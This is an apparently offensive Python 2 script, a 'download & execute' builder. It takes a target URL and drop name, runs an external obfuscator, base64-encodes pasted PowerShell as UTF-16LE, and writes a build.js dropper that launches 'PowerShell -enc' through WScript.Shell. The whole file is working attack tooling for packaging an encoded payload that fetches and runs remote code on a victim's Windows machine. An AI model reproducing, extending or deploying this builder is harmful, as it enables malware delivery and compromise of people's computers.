import base64
import os

banner = ("##############################################################\n"
          "## powershell download & execute , Encoder + Builder        ##\n"
          "## Note: This is not a normal base64 encoder!               ##\n"
          "## It converts the string to UTF-16LE first before encoding ##\n"
          "## as that is what PowerShell expects!                      ##\n"
          "##############################################################")
print(banner)
print('')

target = raw_input('ENTER TARGET URL: ')
dropname = raw_input('ENTER DROP NAME: ')
os.system("obfuscator.exe " + target + " " + dropname)
code = raw_input('CONTROL + V and press ENTER: ')
print('')
shellcode = base64.b64encode(code.encode('UTF-16-LE'))
print (shellcode)
print('')
print('[+] String Encoded.')
file=open('build.js','w')
file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('PowerShell -enc " + shellcode + "');")
file.close()
print('[+] Build Saved.')
print('')
raw_input('PRESS ENTER KEY TO CONTINIUE')
